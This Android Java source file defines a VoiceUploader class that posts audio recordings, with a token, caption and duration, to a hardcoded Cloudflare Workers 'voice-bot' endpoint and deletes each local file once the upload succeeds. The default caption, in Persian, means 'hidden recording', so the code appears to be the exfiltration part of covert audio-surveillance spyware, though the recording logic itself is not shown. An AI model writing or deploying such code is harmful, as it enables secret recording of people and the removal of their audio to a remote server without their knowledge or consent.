package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class VoiceUploader {
    private static final String TAG = "VoiceUploader";
    private static final String WORKER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/voice-event";
    
    private OkHttpClient httpClient;
    
    public VoiceUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build();
    }
    
    public boolean uploadVoice(String filePath, String voiceToken, String caption, long duration) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "فایل وجود ندارد: " + filePath);
                return false;
            }
            
            Log.d(TAG, "📤 آپلود فایل: " + filePath);
            Log.d(TAG, "📏 حجم: " + file.length() + " bytes");
            
            RequestBody fileBody = RequestBody.create(
                file,
                MediaType.parse("audio/m4a")
            );
            
            MultipartBody.Builder builder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("audio", file.getName(), fileBody)
                .addFormDataPart("voice_token", voiceToken != null ? voiceToken : "unknown")
                .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
                .addFormDataPart("duration", String.valueOf(duration / 1000));
            
            RequestBody requestBody = builder.build();
            
            Request request = new Request.Builder()
                .url(WORKER_URL)
                .post(requestBody)
                .build();
            
            Response response = httpClient.newCall(request).execute();
            String responseBody = response.body() != null ? response.body().string() : "";
            
            Log.d(TAG, "📥 پاسخ: " + response.code());
            Log.d(TAG, "📥 پاسخ: " + responseBody);
            
            boolean success = response.isSuccessful();
            response.close();
            
            if (success) {
                Log.d(TAG, "✅ آپلود موفق!");
                file.delete(); // حذف فایل بعد از آپلود
            } else {
                Log.e(TAG, "❌ آپلود ناموفق: " + responseBody);
            }
            
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ خطا در آپلود", e);
            return false;
        }
    }
}
